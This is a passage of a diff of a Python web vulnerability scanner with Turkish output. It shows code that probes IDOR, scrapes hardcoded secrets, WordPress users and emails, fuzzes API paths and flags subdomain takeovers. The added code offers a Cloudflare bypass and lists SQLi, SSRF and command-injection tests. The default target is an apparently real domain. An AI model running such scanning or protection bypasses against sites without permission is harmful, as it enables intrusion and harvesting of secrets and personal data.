-                                    test_r = self.session.get(test_url, timeout=2, verify=False)
-                                    if test_r.status_code == 200 and len(test_r.text) > 100:
-                                        self.results["idor"]["tested"] = True
-                                        self.results["idor"]["result"] = f"IDOR bulundu: {test_url}"
-                                        self.results["vulns"].append({"url": test_url, "type": "IDOR"})
-                                        self.log(f"IDOR: {test_url}", "critical")
-                                    else:
-                                        self.results["idor"]["tested"] = True
-                                        self.results["idor"]["result"] = "IDOR bulunamadı"
-                                        self.log("IDOR: Güvende", "test")
-                                except:
-                                    pass
-
-                        # Robots
-                        if d == "/robots.txt" and r.status_code == 200:
-                            for line in r.text.split("\n"):
-                                if "Disallow:" in line:
-                                    self.results["robots"].append(line.strip())
-                                    self.log(f"Robots: {line.strip()}", "found")
-
-                        # Sitemap
-                        if d == "/sitemap.xml" and r.status_code == 200:
-                            for url2 in re.findall(r'<loc>(.*?)</loc>', r.text):
-                                self.results["sitemap_urls"].append(url2)
-                                self.log(f"Sitemap: {url2[:60]}", "found")
-
-                        # Backup
-                        if d.endswith(('.bak', '.old', '.zip', '.tar', '.gz', '.rar', '.7z')):
-                            self.results["backup_files"].append({"path": d, "size": len(r.content)})
-                            self.log(f"Backup: {d}", "found")
-
-                        # Secrets
-                        secrets = re.findall(r'(api[_-]?key|token|secret|password|passwd)[\s:=]+["\']?([a-zA-Z0-9_\-]{8,})', r.text, re.IGNORECASE)
-                        for secret in secrets:
-                            self.results["hardcoded_secrets"].append({"key": secret[0], "value": secret[1][:20]})
-                            self.log(f"Secret: {secret[0]}={secret[1][:10]}...", "critical")
-
-                        # WP Users
-                        if "wp-json" in d or "wp-content" in d:
-                            if r.status_code == 200:
-                                users = re.findall(r'/"id":(\d+),"name":"([^"]+)"', r.text)
-                                for uid, name in users:
-                                    self.results["wp_users"].append({"id": uid, "name": name})
-                                    self.log(f"WP User: {name} (ID:{uid})", "found")
-                                plugins = re.findall(r'/"plugin":"([^"]+)"', r.text)
-                                for plugin in plugins:
-                                    self.results["wp_plugins"].append(plugin)
-                                    self.log(f"WP Plugin: {plugin}", "found")
-
-                        # Vuln
-                        combined = (r.text + str(r.headers)).lower()
-                        for vuln, pattern in self.vuln_patterns.items():
-                            if re.search(pattern, combined, re.IGNORECASE):
-                                self.results["vulns"].append({"url": url, "type": vuln})
-                                self.log(f"{vuln} ({url})", "critical")
-                        # Email
-                        emails = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', r.text)
-                        for e in emails[:10]:
-                            if e not in self.results["emails"]:
-                                self.results["emails"].append(e)
-                                self.log(f"Email: {e}", "found")
-
-                        # 3. API fuzzing wordlist
-                        if d.startswith("/api"):
-                            api_paths = ["/v1", "/v2", "/v3", "/users", "/posts", "/comments", "/auth", "/login", "/logout", "/register"]
-                            for api_path in api_paths:
-                                test_url = f"{url}{api_path}"
-                                try:
-                                    test_r = self.session.get(test_url, timeout=1, verify=False)
-                                    if test_r.status_code in [200, 201, 401, 403]:
-                                        self.results["api_fuzz"].append({"path": f"{d}{api_path}", "status": test_r.status_code})
-                                        self.log(f"API Fuzz: {d}{api_path} -> {test_r.status_code}", "found")
-                                except: pass
-
-                        # CORS
-                        if "Access-Control-Allow-Origin" in r.headers:
-                            origin = r.headers.get("Access-Control-Allow-Origin")
-                            self.results["cors"] = {"origin": origin}
-                            if origin == "*":
-                                self.results["vulns"].append({"url": url, "type": "CORS Misconfiguration (*)"})
-                                self.log(f"CORS: * (Riskli!)", "critical")
-
-                        # HTTP→HTTPS Redirect
-                        if r.status_code == 302 and "Location" in r.headers and "http://" in r.headers["Location"]:
-                            self.results["vulns"].append({"url": url, "type": "HTTP Redirect (Zayif)"})
-                            self.log(f"HTTP Redirect: {url}", "warning")
                         break
                 except:
                     continue
@@ -663,90 +497,57 @@ class ProMaxPlusScanner:
                 ip = socket.gethostbyname(domain)
                 self.results["subdomains"].append({"domain": domain, "ip": ip})
                 self.log(f"Sub: {domain} -> {ip}", "found")
-                try:
-                    import dns.resolver
-                    cname = dns.resolver.resolve(domain, 'CNAME', lifetime=2)
-                    for c in cname:
-                        if "herokuapp" in str(c) or "github.io" in str(c) or "amazonaws" in str(c) or "azurewebsites" in str(c):
-                            self.results["subdomain_takeover"].append({"domain": domain, "cname": str(c)})
-                            self.log(f"Takeover: {domain} -> {c}", "critical")
-                except: pass
             except: pass
             self.done += 1
             if self.done % 5 == 0: self.progress()
         self.progress()
 
+    # ==================== RAPOR ====================
     def summary(self):
         elapsed = int(time.time() - self.start)
         print("\n" + "="*80)
-        print(f"{BOLD}{C} ULTRA FULL MEGA SCANNER PRO MAX + 10 FIKIR - RAPOR{N}")
+        print(f"{BOLD}{C} TARAMA OZETI + 10 FIKIR{N}")
         print("="*80)
         print(f"{Y}Süre:{N} {elapsed}s")
+        print(f"{Y}Bypass:{N} {'Aktif' if self.bypass_cloudflare else 'Kapali'}")
         print(f"{Y}Port:{N} {len(self.results['ports'])}")
-        print(f"{Y}Banner:{N} {len(self.results['banners'])}")
         print(f"{Y}Dizin:{N} {len(self.results['dirs'])}")
         print(f"{Y}Subdomain:{N} {len(self.results['subdomains'])}")
         print(f"{Y}Vuln:{N} {len(self.results['vulns'])}")
-        print(f"{Y}Email:{N} {len(self.results['emails'])}")
         print(f"{Y}Parameter:{N} {len(self.results['parameters'])}")
-        print(f"{Y}API:{N} {len(self.results['api_endpoints'])}")
-        print(f"{Y}Backup:{N} {len(self.results['backup_files'])}")
-        print(f"{Y}WP Users:{N} {len(self.results['wp_users'])}")
-        print(f"{Y}WP Plugins:{N} {len(self.results['wp_plugins'])}")
-        print(f"{Y}WP Version:{N} {self.results['wp_version'] or '?'}")
-        print(f"{Y}WebSocket:{N} {'Var' if self.results['websocket']['found'] else 'Yok'}")
-        print(f"{Y}gRPC:{N} {'Var' if self.results['grpc']['found'] else 'Yok'}")
         print("="*80)
 
-        # ============ TEST SONUÇLARI ============
-        print(f"\n{BOLD}TEST SONUCLARI{N}")
-        print("="*80)
+        # Test sonuçları (sadece bulunanlar)
+        tests = [
+            ("Blind SQLi", "blind_sqli_tests"),
+            ("XXE", "xxe_tests"),
+            ("SSRF", "ssrf_tests"),
+            ("CSRF", "csrf_tests"),
+            ("JWT", "jwt_tests"),
+            ("CORS", "cors_tests"),
+            ("Host Header", "host_header_tests"),
+            ("Path Traversal", "path_traversal_tests"),
+            ("Command Injection", "command_injection_tests"),
+            ("File Upload", "file_upload_tests")
+        ]
 
-        # SQLi
-        if self.results["sqli_tests"]:
-            bulunan = [t for t in self.results["sqli_tests"] if t["status"] == "BULUNDU!"]
-            print(f"{Y}SQLi Testi:{N} {len(bulunan)} bulundu, {len(self.results['sqli_tests'])} test yapıldı")
-            for t in self.results["sqli_tests"][:5]:
-                status_icon = "🔥" if t["status"] == "BULUNDU!" else "✅" if t["status"] == "Güvende" else "❌"
-                print(f"  {status_icon} {t['url'][:60]} -> {t['status']}")
+        print(f"\n{BOLD}TEST SONUCLARI (BULUNANLAR){N}")
+        found_any = False
+        for name, key in tests:
+            items = self.results.get(key, [])
+            bulunan = [x for x in items if x.get("status") == "BULUNDU!" or x.get("status") == "TOKEN EKSIK!"]
+            if bulunan:
+                found_any = True
+                print(f"  {R}{name}:{N} {len(bulunan)} bulundu")
+                for item in bulunan[:5]:
+                    print(f"    [!] {item.get('url', item.get('payload', ''))[:60]}")
+        if not found_any:
+            print(f"  {G}Hiç güvenlik açığı bulunamadı{N}")
 
-        # XSS
-        if self.results["xss_tests"]:
-            bulunan = [t for t in self.results["xss_tests"] if t["status"] == "BULUNDU!"]
-            print(f"{Y}XSS Testi:{N} {len(bulunan)} bulundu, {len(self.results['xss_tests'])} test yapıldı")
-            for t in self.results["xss_tests"][:5]:
-                status_icon = "🔥" if t["status"] == "BULUNDU!" else "✅" if t["status"] == "Güvende" else "❌"
-                print(f"  {status_icon} {t['url'][:50]} -> {t['status']}")
-
-        # Open Redirect
-        if self.results["open_redirect_tests"]:
-            bulunan = [t for t in self.results["open_redirect_tests"] if t["status"] == "BULUNDU!"]
-            print(f"{Y}Open Redirect:{N} {len(bulunan)} bulundu, {len(self.results['open_redirect_tests'])} test yapıldı")
-
-        # Rate Limit
-        print(f"{Y}Rate Limit:{N} {self.results['rate_limit']['result']}")
-        # 2FA
-        print(f"{Y}2FA Bypass:{N} {self.results['twofa_bypass']['result']}")
-        # IDOR
-        print(f"{Y}IDOR:{N} {self.results['idor']['result']}")
-
-        # Vuln list
         if self.results['vulns']:
-            print(f"\n{R}GUVENLIK ACIKLARI:{N}")
+            print(f"\n{R}TUM GUVENLIK ACIKLARI:{N}")
             for v in self.results['vulns'][:20]:
                 print(f"  [!] {v['type']} -> {v['url'][:60]}")
-
-        if self.results['dirs']:
-            print(f"\n{G}DIZINLER (ilk 15):{N}")
-            for d in self.results['dirs'][:15]:
-                print(f"  [+] {d['path']} -> {d['status']}")
-
-        if self.results['subdomain_takeover']:
-            print(f"\n{R}SUBDOMAIN TAKEOVER:{N}")
-            for t in self.results['subdomain_takeover']:
-                print(f"  [!] {t['domain']} -> {t['cname']}")
-
-        print("="*80)
 
     def save(self):
         fname = f"scan_{self.target}_{int(time.time())}.json"
@@ -755,30 +556,44 @@ class ProMaxPlusScanner:
         self.log(f"Rapor: {fname}", "success")
 
     def run(self):
-        print(f"{BOLD}{M} ULTRA FULL MEGA SCANNER PRO MAX + 10 FIKIR{N}\n")
-        self.dns()
+        print(f"{BOLD}{M} SCANNER + 10 FIKIR + CLOUDFLARE BYPASS{N}")
+        print(f"{B}Bypass: {'AKTIF' if self.bypass_cloudflare else 'KAPALI'}{N}\n")
+
         self.port()
         self.ssl()
         self.header()
-        self.http_methods()
-        self.tech()
         self.dir()
         self.sub()
         self.done = self.total
         self.progress()
         self.summary()
+
         if input("\nRaporu kaydet? (E/H): ").upper() == "E":
             self.save()
 
 # ============================================================
 def main():
     print(f"{BOLD}╔═══════════════════════════════════════════════╗")
-    print(f"║ {C} PRO MAX + 10 FIKIR{BOLD}                      ║")
-    print(f"║ {Y}SQLi | XSS | Redirect | Rate Limit{BOLD}      ║")
-    print(f"║ {M}2FA | IDOR | API Fuzz | WebSocket | gRPC{BOLD} ║")
+    print(f"║ {C} SCANNER + 10 FIKIR{BOLD}                       ║")
+    print(f"║ {Y}Blind SQLi | XXE | SSRF | CSRF | JWT{BOLD}     ║")
+    print(f"║ {M}CORS | Host Header | Path Traversal{BOLD}      ║")
+    print(f"║ {G}Command Injection | File Upload{BOLD}          ║")
     print("╚═══════════════════════════════════════════════╝\n")
+
     target = input("Hedef: ").strip() or "silvacheck.com"
-    ProMaxPlusScanner(target).run()
+
+    print("\n🔧 Cloudflare bypass açılsın mı?")
+    print("   [E] Evet (cloudscraper ile istek yapar)")
+    print("   [H] Hayır (normal requests kullanır)")
+    bypass = input("> ").upper().strip()
+    bypass_cloudflare = bypass == "E"
+
+    if bypass_cloudflare and not CLOUDSCRAPER_AVAILABLE:
+        print("⚠️ cloudscraper yüklü değil! pip install cloudscraper")
+        bypass_cloudflare = False
+
+    scanner = ProMaxPlusScanner(target, bypass_cloudflare)
+    scanner.run()
 
 if __name__ == "__main__":
     try:
